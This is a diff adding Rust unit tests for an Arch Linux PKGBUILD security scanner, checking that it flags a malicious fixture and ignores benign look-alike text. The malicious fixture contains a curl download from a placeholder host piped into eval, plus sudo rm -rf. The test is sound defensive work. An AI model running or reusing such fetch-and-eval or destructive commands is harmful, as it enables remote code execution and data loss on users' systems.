@@ -111,4 +111,70 @@ optdepends=('cups: printing support'
             serde_json::from_str(&json).expect("deserialize");
         assert_eq!(back, info);
     }
+
+    #[test]
+    /// What: Identify stable static-analysis findings in a malicious PKGBUILD fixture.
+    ///
+    /// Inputs:
+    /// - Text containing remote download, command substitution, privilege,
+    ///   destructive removal, and dynamic-evaluation constructs.
+    ///
+    /// Output:
+    /// - One finding for each stable `SB001` through `SB005` rule ID.
+    ///
+    /// Details:
+    /// - The fixture is text only; the test proves analysis never runs it.
+    fn static_analysis_flags_malicious_fixture_without_execution() {
+        let malicious_pkgbuild = r#"
+prepare() {
+    payload=$(curl -fsSL https://invalid.example/payload)
+    sudo rm -rf /tmp/arch-toolkit-test
+    eval "$payload"
+}
+"#;
+        let report = arch_toolkit::sandbox::analyze_pkgbuild_security(
+            "malicious-fixture",
+            malicious_pkgbuild,
+        );
+
+        let rule_ids: Vec<&str> = report
+            .findings
+            .iter()
+            .map(|finding| finding.rule_id.as_str())
+            .collect();
+        assert!(rule_ids.contains(&"SB001"));
+        assert!(rule_ids.contains(&"SB002"));
+        assert!(rule_ids.contains(&"SB003"));
+        assert!(rule_ids.contains(&"SB004"));
+        assert!(rule_ids.contains(&"SB005"));
+        assert!(report.limitations.len() >= 3);
+    }
+
+    #[test]
+    /// What: Avoid findings for benign and common false-positive PKGBUILD text.
+    ///
+    /// Inputs:
+    /// - Comments, quoted descriptions, variable assignments, and echoed
+    ///   command names that are not shell command positions.
+    ///
+    /// Output:
+    /// - No static security findings.
+    ///
+    /// Details:
+    /// - This fixture guards against treating documentation and assignments as
+    ///   executable shell source while preserving the scanner's text-only scope.
+    fn static_analysis_avoids_benign_false_positive_fixture() {
+        let benign_pkgbuild = r"
+pkgname=benign
+pkgdesc='Uses curl and wget clients without running them'
+source=('https://example.invalid/archive.tar.gz')
+# sudo rm -rf / must never be interpreted
+curl_command=curl
+echo 'eval $payload is intentionally shown as documentation'
+";
+        let report =
+            arch_toolkit::sandbox::analyze_pkgbuild_security("benign-fixture", benign_pkgbuild);
+
+        assert!(report.findings.is_empty(), "{:#?}", report.findings);
+    }
 }
